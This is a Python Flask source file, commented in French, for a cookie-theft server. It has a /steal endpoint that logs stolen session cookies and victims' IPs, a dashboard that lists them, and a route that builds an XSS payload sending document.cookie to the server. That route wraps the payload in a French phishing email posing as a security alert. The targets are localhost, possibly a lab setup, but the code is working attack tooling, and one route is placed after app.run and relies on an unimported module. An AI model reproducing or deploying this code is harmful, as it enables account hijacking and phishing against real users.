from flask import Flask, request, render_template, jsonify
from datetime import datetime as dt
import os
import json
import threading
from collections import deque

app = Flask(__name__)

# Configuration
COOKIE_FILE = 'stolen_cookies.json'
MAX_COOKIES = 100
REFRESH_INTERVAL = 5

# Structure de données thread-safe
cookies_cache = deque(maxlen=MAX_COOKIES)
last_update = 0
cache_lock = threading.Lock()

def init_cookie_file():
    """Initialise le fichier cookie s'il n'existe pas"""
    if not os.path.exists(COOKIE_FILE):
        try:
            with open(COOKIE_FILE, 'w') as f:
                json.dump([], f)
        except Exception as e:
            print(f"Erreur d'initialisation: {e}")

def load_cookies():
    """Charge les cookies depuis le fichier JSON"""
    global cookies_cache, last_update
    
    try:
        file_mtime = os.path.getmtime(COOKIE_FILE) if os.path.exists(COOKIE_FILE) else 0
        
        if file_mtime <= last_update:
            return cookies_cache
        
        with cache_lock:
            if os.path.exists(COOKIE_FILE) and os.path.getsize(COOKIE_FILE) > 0:
                with open(COOKIE_FILE, 'r') as f:
                    data = json.load(f)
                    cookies_cache = deque(data, maxlen=MAX_COOKIES)
                    last_update = file_mtime
            else:
                cookies_cache = deque(maxlen=MAX_COOKIES)
    except Exception as e:
        print(f"Erreur de chargement: {e}")
    
    return cookies_cache

def save_cookie(ip, cookie):
    """Enregistre un nouveau cookie de manière thread-safe"""
    timestamp = dt.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = {
        'timestamp': timestamp,
        'ip': ip,
        'cookie': cookie
    }
    
    try:
        with cache_lock:
            # Charger les cookies existants
            cookies = []
            if os.path.exists(COOKIE_FILE) and os.path.getsize(COOKIE_FILE) > 0:
                with open(COOKIE_FILE, 'r') as f:
                    cookies = json.load(f)
            
            # Ajouter le nouveau cookie
            cookies.insert(0, entry)
            
            # Sauvegarder
            with open(COOKIE_FILE, 'w') as f:
                json.dump(cookies[:MAX_COOKIES], f)
            
            # Mettre à jour le cache
            cookies_cache.appendleft(entry)
    except Exception as e:
        print(f"Erreur de sauvegarde: {e}")

@app.route('/steal')
def steal():
    """Endpoint pour voler les cookies"""
    cookie = request.args.get('c')
    if cookie:
        client_ip = request.remote_addr
        save_cookie(client_ip, cookie)
        print(f"[+] Cookie volé reçu de {client_ip}")
    
    return '<script>window.location="https://google.com"</script>'

@app.route('/dashboard')
def dashboard():
    """Tableau de bord pour afficher les cookies volés"""
    try:
        cookies = list(load_cookies())
        total = len(cookies)
        last_cookie = cookies[0] if cookies else None
        current_time = dt.now().strftime('%Y-%m-%d %H:%M:%S')
        
        return render_template('dashboard.html', 
                               total=total, 
                               last_cookie=last_cookie,
                               cookies=cookies,
                               refresh_interval=REFRESH_INTERVAL,
                               current_time=current_time)
    except Exception as e:
        return f"Erreur dans le dashboard: {str(e)}", 500

@app.route('/dashboard-data')
def dashboard_data():
    """Endpoint pour les données du dashboard (AJAX)"""
    try:
        cookies = list(load_cookies())
        total = len(cookies)
        last_cookie = cookies[0] if cookies else None
        
        return jsonify({
            'success': True,
            'total': total,
            'last_cookie': last_cookie,
            'cookies': cookies,
            'current_time': dt.now().strftime('%Y-%m-%d %H:%M:%S')
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/clear')
def clear_cookies():
    """Efface tous les cookies"""
    try:
        with cache_lock:
            with open(COOKIE_FILE, 'w') as f:
                json.dump([], f)
            cookies_cache.clear()
        return "Cookies effacés!", 200
    except Exception as e:
        return f"Erreur: {e}", 500

@app.route('/test')
def test_cookie():
    """Route pour tester l'ajout de cookie"""
    save_cookie("127.0.0.1", "test_cookie=value; session=123456")
    return "Cookie test ajouté!", 200

if __name__ == '__main__':
    init_cookie_file()
    app.run(port=5001, debug=True, threaded=True)

@app.route('/generate-phishing-link')
def generate_phishing_link():
    target_email = request.args.get('email', 'admin@example.com')
    target_name = request.args.get('name', 'Admin')
    
    # URL de l'application vulnérable avec payload XSS
    vulnerable_url = "http://localhost:5000/search?q="
    xss_payload = f"<script>fetch('http://localhost:5001/steal?c='+document.cookie)</script>"
    
    # Encoder le payload
    encoded_payload = requests.utils.quote(xss_payload)
    
    # Créer le lien de phishing
    phishing_link = f"{vulnerable_url}{encoded_payload}"
    
    # Générer un email de phishing convaincant
    phishing_email = f"""
    <html>
    <body>
        <p>Bonjour {target_name},</p>
        <p>Nous avons détecté une activité suspecte sur votre compte.</p>
        <p>Veuillez vérifier immédiatement votre compte en cliquant sur ce lien :</p>
        <p><a href="{phishing_link}">Vérifier mon compte</a></p>
        <p>Cordialement,<br>Le Service de Sécurité</p>
    </body>
    </html>
    """
    
    return phishing_email